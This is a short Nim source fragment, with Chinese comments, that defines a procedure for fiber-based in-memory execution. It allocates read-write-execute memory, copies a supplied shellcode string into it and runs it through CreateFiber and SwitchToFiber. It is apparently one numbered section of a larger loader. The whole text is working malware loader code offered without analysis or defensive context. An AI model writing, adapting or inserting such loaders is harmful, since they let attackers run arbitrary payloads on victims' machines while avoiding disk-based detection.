import winim/lean  # 用于 Windows API (Fiber 注入)
# ==========================================
# 4. Fiber 内存加载执行
# ==========================================
proc runFiber*(shellcode: string): void =
  if shellcode.len == 0: return
  discard ConvertThreadToFiber(NULL)
  let vAlloc = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  var bytesWritten: SIZE_T
  let pHandle = GetCurrentProcess()
  WriteProcessMemory(pHandle, vAlloc, unsafeAddr shellcode[0], cast[SIZE_T](shellcode.len), addr bytesWritten)
  let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](vAlloc), NULL)
  SwitchToFiber(xFiber)